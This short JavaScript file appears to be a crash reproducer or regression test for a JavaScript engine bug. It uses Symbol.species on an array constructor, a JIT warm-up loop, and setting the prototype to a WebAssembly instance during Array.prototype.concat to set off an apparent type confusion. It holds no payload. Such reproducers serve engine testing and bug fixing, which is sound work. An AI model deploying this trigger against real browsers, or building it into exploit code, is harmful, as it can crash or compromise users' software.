const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])));

let do_bug = false;

function trigger() {
    const a = [1.1];
    a.constructor = {
        [Symbol.species]: function() {
            const res = [];
            if (do_bug) {
                Object.setPrototypeOf(res, wasm_instance);
            }
            return res;
        }
    };
    a.concat([]);
}

for (let i = 0; i < 25000; i++) {
    trigger();
}

do_bug = true;
trigger();